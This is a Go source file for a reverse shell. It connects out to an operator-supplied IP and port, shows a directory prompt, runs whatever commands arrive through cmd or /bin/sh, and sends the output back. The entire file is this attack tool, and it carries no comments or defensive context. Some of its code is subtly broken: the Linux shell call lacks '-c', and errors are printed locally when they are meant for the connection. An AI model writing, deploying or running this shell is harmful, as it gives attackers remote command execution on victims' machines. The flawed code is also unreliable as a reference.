package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

func get_arch_message_format(msg string) (string, []string) {
	var exe string
	os := runtime.GOOS
	switch os {
	case "windows":
		exe = "cmd"
	case "linux":
		exe = "/bin/sh"
	}
	args := []string{}
	if exe == "cmd" {
		args = append(args, "/c")
	}
	args = append(args, strings.Fields(msg)...)
	return exe, args
}

func main() {

	args := os.Args
	if len(args) < 2 {
		fmt.Println("Not enough arguments!")
		fmt.Println("Usage: app -i 10.10.10.10 -p 8089")
		return
	}

	I_P := flag.String("i", "", "Host to connect to")
	L_PORT := flag.String("p", "", "Port to listen on")
	flag.Parse()

	conn, _ := net.Dial("tcp", fmt.Sprintf("%s:%s", *I_P, *L_PORT))

	for {
		cwd, _ := os.Getwd()
		fmt.Fprintf(conn, "\n%s> ", cwd)
		msg, _ := bufio.NewReader(conn).ReadString('\n')
		exe, args := get_arch_message_format(msg)
		out, err := exec.Command(exe, args...).Output()
		if err != nil {
			fmt.Println(conn, "\n%s\n", err)
		}
		fmt.Fprintf(conn, "%s", out)
	}
}
